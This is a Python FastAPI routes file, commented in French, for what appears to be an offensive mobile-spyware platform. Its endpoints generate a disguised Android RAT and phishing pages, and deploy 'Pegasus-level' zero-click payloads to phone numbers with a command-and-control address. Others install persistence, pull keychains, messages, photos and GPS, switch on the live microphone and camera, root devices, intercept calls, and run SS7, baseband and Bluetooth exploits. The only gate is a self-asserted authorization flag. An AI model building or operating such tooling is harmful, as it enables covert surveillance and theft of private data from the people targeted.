"""Routes Mobile — Android & iOS enumeration / exploitation + Bloc 1 Zero-Click."""
from __future__ import annotations

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from typing import Optional, List

from api.routes.auth import get_current_user
from services.mobile.mobile_service import mobile_service
from services.mobile.ios_exploit_service import iOSExploitService
from services.mobile.android_exploit_service import AndroidExploitService
from services.mobile.baseband_service import BasebandService
from services.mobile.bluetooth_exploit_service import BluetoothExploitService

router = APIRouter()

_ios  = iOSExploitService()
_aex  = AndroidExploitService()
_bb   = BasebandService()
_bt   = BluetoothExploitService()


# ── Schemas ────────────────────────────────────────────────────────────────────

class ADBRequest(BaseModel):
    serial: str
    authorization_confirmed: bool = False


class ADBFileRequest(BaseModel):
    serial: str
    remote_path: str
    authorization_confirmed: bool = False


class ADBShellRequest(BaseModel):
    serial: str
    command: str
    authorization_confirmed: bool = False


class AndroidRATRequest(BaseModel):
    lhost: str
    lport: int
    app_name: str = "Calculator"
    authorization_confirmed: bool = False


class FridaRequest(BaseModel):
    device_serial: str
    package: str
    script_type: str = "ssl_bypass"
    authorization_confirmed: bool = False


class PhishingRequest(BaseModel):
    target_app: str
    lhost: str
    lport: int
    authorization_confirmed: bool = False


class APKRequest(BaseModel):
    apk_path: str
    authorization_confirmed: bool = False


class IPARequest(BaseModel):
    ipa_path: str
    authorization_confirmed: bool = False


class iOSBackupRequest(BaseModel):
    device_id: str = ""
    authorization_confirmed: bool = False


# ── Guard ─────────────────────────────────────────────────────────────────────

def _require_auth(auth: bool, action: str):
    if not auth:
        raise HTTPException(403, detail=f"{action} nécessite authorization_confirmed=true")


# ── Routes ─────────────────────────────────────────────────────────────────────

@router.get("/android/devices")
async def list_devices(authorization_confirmed: bool = False, current_user=Depends(get_current_user)):
    _require_auth(authorization_confirmed, "Liste appareils ADB")
    return await mobile_service.list_adb_devices()


@router.post("/android/enumerate")
async def enumerate_device(req: ADBRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Énumération device Android")
    return await mobile_service.adb_enumerate_device(req.serial)


@router.post("/android/sms")
async def dump_sms(req: ADBRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Extraction SMS")
    messages = await mobile_service.adb_dump_sms(req.serial)
    return {"messages": messages, "count": len(messages)}


@router.post("/android/pull")
async def pull_file(req: ADBFileRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Pull fichier ADB")
    local_path = await mobile_service.adb_pull_file(req.serial, req.remote_path)
    return {"local_path": local_path, "remote_path": req.remote_path}


@router.post("/android/shell")
async def adb_shell(req: ADBShellRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Shell ADB")
    output = await mobile_service.adb_shell_command(req.serial, req.command)
    return {"output": output, "command": req.command}


@router.post("/android/rat/generate")
async def generate_rat(req: AndroidRATRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Génération Android RAT")
    return await mobile_service.generate_android_rat(req.lhost, req.lport, req.app_name)


@router.post("/android/apk/analyze")
async def analyze_apk(req: APKRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Analyse APK")
    return await mobile_service.analyze_apk(req.apk_path)


@router.post("/android/frida")
async def frida_hook(req: FridaRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Frida Hook")
    return await mobile_service.frida_hook(req.device_serial, req.package, req.script_type)


@router.post("/android/phishing")
async def create_phishing(req: PhishingRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Création page phishing mobile")
    return await mobile_service.create_phishing_page(req.target_app, req.lhost, req.lport)


@router.post("/ios/backup")
async def ios_backup(req: iOSBackupRequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Extraction backup iOS")
    return await mobile_service.extract_ios_backup(req.device_id)


@router.post("/ios/ipa/analyze")
async def analyze_ipa(req: IPARequest, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Analyse IPA")
    return await mobile_service.analyze_ipa(req.ipa_path)


# ═══════════════════════════════════════════════════════════════════════════════
# BLOC 1 — iOS ZERO-CLICK (NIVEAU PEGASUS)
# ═══════════════════════════════════════════════════════════════════════════════

class ZeroClickReq(BaseModel):
    target_phone: str
    vector: str = "imessage"
    cve: str = "CVE-2021-30860"
    c2_ip: str = "127.0.0.1"
    c2_port: int = 4444
    authorization_confirmed: bool = False


class InfectionReq(BaseModel):
    infection_id: str
    authorization_confirmed: bool = False


class PersistenceReq(BaseModel):
    infection_id: str
    method: str = "mobileconfig"
    authorization_confirmed: bool = False


class ExtractReq(BaseModel):
    infection_id: str
    data_type: str = "contacts"
    authorization_confirmed: bool = False


class SMSInjectReq(BaseModel):
    infection_id: str
    sender: str
    body: str
    target: str = ""
    authorization_confirmed: bool = False


@router.get("/ios/vulnerabilities")
async def ios_vulnerabilities(ios_version: str = "", current_user=Depends(get_current_user)):
    return _ios.list_vulnerabilities(ios_version)


@router.post("/ios/zero-click/payload")
async def ios_payload(req: ZeroClickReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS zero-click payload")
    return _ios.generate_payload(req.target_phone, req.vector, req.cve)


@router.post("/ios/zero-click/deploy")
async def ios_deploy(req: ZeroClickReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS zero-click deploy")
    p = _ios.generate_payload(req.target_phone, req.vector, req.cve)
    return _ios.deploy(req.target_phone, p["payload_id"], req.c2_ip, req.c2_port)


@router.get("/ios/zero-click/status")
async def ios_status(infection_id: str, current_user=Depends(get_current_user)):
    return _ios.status(infection_id)


@router.post("/ios/persistence/profile")
async def ios_persistence(req: PersistenceReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS persistence")
    return _ios.install_persistence(req.infection_id, req.method)


@router.post("/ios/extract/contacts")
async def ios_extract_contacts(req: ExtractReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS extract contacts")
    return _ios.extract(req.infection_id, "contacts")


@router.post("/ios/extract/messages")
async def ios_extract_messages(req: ExtractReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS extract messages")
    return _ios.extract(req.infection_id, "messages")


@router.post("/ios/extract/photos")
async def ios_extract_photos(req: ExtractReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS extract photos")
    return _ios.extract(req.infection_id, "photos")


@router.post("/ios/extract/keychain")
async def ios_extract_keychain(req: ExtractReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS extract keychain")
    return _ios.extract(req.infection_id, "keychain")


@router.post("/ios/extract/gps")
async def ios_extract_gps(req: ExtractReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS GPS history")
    return _ios.extract(req.infection_id, "gps")


@router.post("/ios/extract/mic")
async def ios_live_mic(req: InfectionReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS live mic")
    return _ios.live_mic(req.infection_id)


@router.post("/ios/extract/camera")
async def ios_live_camera(req: InfectionReq, camera: str = "front",
                           current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS live camera")
    return _ios.live_camera(req.infection_id, camera)


@router.post("/ios/clean")
async def ios_clean(req: InfectionReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "iOS clean")
    return _ios.clean(req.infection_id)


# ═══════════════════════════════════════════════════════════════════════════════
# BLOC 1 — ANDROID ZERO-CLICK
# ═══════════════════════════════════════════════════════════════════════════════

@router.post("/android/zero-click/payload")
async def android_payload(req: ZeroClickReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android zero-click payload")
    return _aex.generate_payload(req.target_phone, req.vector, req.cve)


@router.post("/android/zero-click/deploy")
async def android_deploy(req: ZeroClickReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android zero-click deploy")
    p = _aex.generate_payload(req.target_phone, req.vector, req.cve)
    return _aex.deploy(req.target_phone, p["payload_id"], req.c2_ip, req.c2_port)


@router.get("/android/zero-click/status")
async def android_status(infection_id: str, current_user=Depends(get_current_user)):
    return _aex.status(infection_id)


@router.post("/android/root/exploit")
async def android_root(req: InfectionReq, method: str = "dirty_pipe",
                        current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android root exploit")
    return _aex.root_exploit(req.infection_id, method)


@router.post("/android/persistence")
async def android_persistence(req: PersistenceReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android persistence")
    return _aex.install_persistence(req.infection_id, req.method)


@router.post("/android/extract/all")
async def android_extract(req: InfectionReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android extract all")
    return _aex.extract_all(req.infection_id)


@router.post("/android/mic/live")
async def android_mic(req: InfectionReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android live mic")
    return _aex.live_mic(req.infection_id)


@router.post("/android/camera/live")
async def android_camera(req: InfectionReq, camera: str = "front",
                          current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android live camera")
    return _aex.live_camera(req.infection_id, camera)


@router.post("/android/sms/inject")
async def android_sms_inject(req: SMSInjectReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android SMS inject")
    return _aex.inject_sms(req.infection_id, req.sender, req.body, req.target)


@router.post("/android/clean")
async def android_clean(req: InfectionReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Android clean")
    return _aex.clean(req.infection_id)


# ═══════════════════════════════════════════════════════════════════════════════
# BLOC 1 — BASEBAND EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════════

class BasebandReq(BaseModel):
    target: str
    chipset: str = "Qualcomm MDM9655"
    authorization_confirmed: bool = False


class BasebandActionReq(BaseModel):
    implant_id: str
    authorization_confirmed: bool = False


class SS7Req(BaseModel):
    msisdn: str
    attack_type: str = "location_tracking"
    authorization_confirmed: bool = False


@router.post("/baseband/scan")
async def baseband_scan(req: BasebandReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Baseband scan")
    return _bb.scan_chipset(req.target)


@router.post("/baseband/exploit")
async def baseband_exploit(req: BasebandReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Baseband exploit")
    return _bb.exploit_baseband(req.target, req.chipset)


@router.post("/baseband/sms/intercept")
async def baseband_sms(req: BasebandActionReq, duration: int = 60,
                        current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Baseband SMS intercept")
    return _bb.intercept_sms(req.implant_id, duration)


@router.post("/baseband/call/intercept")
async def baseband_call(req: BasebandActionReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Baseband call intercept")
    return _bb.intercept_call(req.implant_id)


@router.post("/baseband/gps/spoof")
async def baseband_gps(req: BasebandActionReq, lat: float = 48.8566,
                        lon: float = 2.3522, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Baseband GPS spoof")
    return _bb.spoof_gps(req.implant_id, lat, lon)


@router.post("/baseband/ss7/attack")
async def ss7_attack(req: SS7Req, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "SS7 attack")
    return _bb.ss7_attack(req.msisdn, req.attack_type)


@router.post("/baseband/network/downgrade")
async def baseband_downgrade(req: BasebandActionReq, target_gen: str = "2G",
                              current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Network downgrade")
    return _bb.downgrade_network(req.implant_id, target_gen)


# ═══════════════════════════════════════════════════════════════════════════════
# BLOC 1 — BLUETOOTH EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════════

class BTScanReq(BaseModel):
    interface: str = "hci0"
    duration: int = 10
    authorization_confirmed: bool = False


class BTExploitReq(BaseModel):
    target_mac: str
    authorization_confirmed: bool = False


@router.get("/bluetooth/exploits")
async def bt_exploits(current_user=Depends(get_current_user)):
    return _bt.list_exploits()


@router.post("/bluetooth/scan")
async def bt_scan(req: BTScanReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Bluetooth scan")
    return _bt.scan_devices(req.interface, req.duration)


@router.post("/bluetooth/exploit/blueborne")
async def bt_blueborne(req: BTExploitReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "BlueBorne exploit")
    return _bt.exploit_blueborne(req.target_mac)


@router.post("/bluetooth/exploit/sweyntooth")
async def bt_sweyntooth(req: BTExploitReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "SweynTooth exploit")
    return _bt.exploit_sweyntooth(req.target_mac)


@router.post("/bluetooth/exploit/braktooth")
async def bt_braktooth(req: BTExploitReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "BrakTooth exploit")
    return _bt.exploit_braktooth(req.target_mac)


@router.post("/bluetooth/sniff")
async def bt_sniff(req: BTScanReq, current_user=Depends(get_current_user)):
    _require_auth(req.authorization_confirmed, "Bluetooth sniff")
    return _bt.sniff_traffic(req.interface, req.duration)
